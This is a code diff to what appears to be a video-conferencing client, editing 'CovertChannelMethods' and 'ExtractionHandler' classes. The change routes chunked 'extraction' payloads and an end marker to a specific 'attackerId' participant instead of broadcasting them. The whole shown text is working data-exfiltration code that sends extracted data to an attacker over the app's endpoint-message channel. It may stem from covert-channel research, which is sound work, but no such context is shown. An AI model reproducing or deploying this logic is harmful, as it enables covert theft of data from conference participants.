@@ -22,8 +22,8 @@ class CovertChannelMethods {
      * Sending data using simple plain method
      * @param {any} data - specified data to be sent
      */
-    static async usePlain(data) {
-        APP.conference.sendEndpointMessage('', {
+    static async usePlain(data, attackerId) {
+        APP.conference.sendEndpointMessage(attackerId, {
             extraction: 'reply',
             payload: data
         });
@@ -103,12 +103,12 @@ export class ExtractionHandler {
      * Send data through the specified method.
      * @param {any} data - data to be sent.
      */
-    async sendAll(data) {
+    async sendAll(data, attackerId) {
         for (const chunkData of splitString(data, this.configuration.chunkSize)) {
             // send data using corresponding method
-            await CovertChannelMethods.options[this.configuration.method](chunkData);
+            await CovertChannelMethods.options[this.configuration.method](chunkData, attackerId);
         }
-        APP.conference.sendEndpointMessage('', {
+        APP.conference.sendEndpointMessage(attackerId, {
             extraction: 'reply',
             isEnd: true
         });
